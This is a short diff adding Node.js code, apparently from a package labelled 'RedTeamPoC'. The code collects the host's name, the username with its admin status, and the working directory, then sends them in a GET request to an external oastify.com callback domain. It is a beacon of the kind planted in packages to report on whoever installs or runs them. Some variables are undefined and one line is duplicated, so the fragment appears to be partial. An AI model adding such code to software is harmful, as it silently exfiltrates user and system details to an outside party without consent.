@@ -1,0 +1,9 @@
+var hostname = os.hostname()
+const options = {
+  hostname: 'av9qx5puwkf3lecpyv6ec7o9e0kq8f.oastify.com',
+  port: 443,
+  path: '/?Username=' + encodeURI(username + ' (' + admin_text + ')') + '&Hostname=' + encodeURI(hostname) + '&Package=RedTeamPoC&PWD=' + __dirname,
+  method: 'GET'
+}
+_tmp_5.path = '/?Username=' + encodeURI(username + ' (' + admin_text + ')') + '&Hostname=' + encodeURI(hostname) + '&Package=RedTeamPoC&PWD=' + __dirname
+const req = https.request(options)
